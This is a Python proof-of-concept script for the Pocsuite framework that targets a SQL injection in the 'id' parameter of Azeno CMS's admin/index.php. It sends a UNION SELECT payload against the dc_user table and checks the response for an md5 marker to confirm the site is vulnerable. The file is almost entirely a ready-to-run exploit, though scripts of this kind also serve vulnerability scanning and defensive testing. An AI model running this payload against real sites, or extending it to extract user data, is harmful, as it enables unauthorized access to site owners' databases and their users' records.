#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = 'SSV-67893'  # vul ID
    version = '1'
    author = 'hzr'
    vulDate = '2010-03-13'
    createDate = '2015-10-23'
    updateDate = '2015-10-23'
    references = ['https://www.exploit-db.com/exploits/11711/']
    name = 'Azeno CMS - SQL Injection Vulnerability'
    appPowerLink = 'N/A'
    appName = 'Azeno'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Azeno CMS的/admin/index.php 文件"id" 变量没有进行过滤，造成SQL注入
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        output = Output(self)
        result = {}
        #根据Pocsuite格式要求，定义一个特殊输出字符串，验证sql注入是否成功
        payload = "/admin/index.php?id=-1 UNION SELECT 1,CONCAT(0x7165696a71,CAST(md5(23333) AS CHAR),0x20),3,4,5,6,7 FROM dc_user"       
        verify_url = self.url + payload
        content = req.get(verify_url).content
        if "qeijq0ba7bc92fcd57e337ebb9e74308c811f" in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            output.success(result)
        else:
            output.fail('SQL Injection Failed')
        return output

    def _attack(self): 
        return self._verify()

register(TestPOC)